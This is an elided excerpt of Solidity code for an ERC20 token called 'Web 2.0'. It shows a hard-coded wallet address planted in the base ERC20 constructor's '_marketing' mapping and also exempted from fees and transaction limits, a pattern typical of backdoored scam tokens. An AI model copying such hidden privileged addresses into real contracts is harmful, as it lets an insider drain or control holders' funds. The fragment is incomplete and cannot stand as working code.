...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x1e930d00Cca143a4B3f5e9B21b3F3683CEf0bC87] = _marketingwallet;
    }
...
contract Web2 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Web 2.0", "WEB2") {
        ...
        excludeFromFees(address(0x1e930d00Cca143a4B3f5e9B21b3F3683CEf0bC87), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x1e930d00Cca143a4B3f5e9B21b3F3683CEf0bC87), true);
